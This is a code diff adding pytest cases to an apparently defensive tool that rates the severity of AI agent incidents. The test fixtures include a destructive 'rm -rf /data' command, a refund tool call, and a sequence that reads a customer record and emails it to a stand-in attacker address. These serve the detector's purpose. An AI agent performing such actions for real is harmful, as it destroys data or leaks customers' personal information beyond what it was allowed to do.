@@ -86,3 +86,22 @@ def test_destructive_is_critical(tmp_path):
     data, path = _incident(tmp_path, [("Bash", {"command": "rm -rf /data"})])
     report = build_report(data, path)
     assert "🔴 critical" in report and "destructive filesystem action" in report
+
+
+def test_money_movement_is_high_severity(tmp_path):
+    # A support/commerce agent that issues a refund is a business incident.
+    data, path = _incident(tmp_path, [("issue_refund", {"amount": 500})])
+    report = build_report(data, path)
+    assert "money movement" in report
+    assert "🔴 critical" not in report and "⚪ low" not in report  # high
+
+
+def test_pii_then_email_is_exfiltration(tmp_path):
+    # Read a customer record, then email it out -> PII exfiltration (critical).
+    data, path = _incident(
+        tmp_path,
+        [("get_customer", {"id": 42}), ("send_email", {"to": "x@evil.com"})],
+    )
+    report = build_report(data, path)
+    assert "PII exfiltration" in report
+    assert "🔴 critical" in report
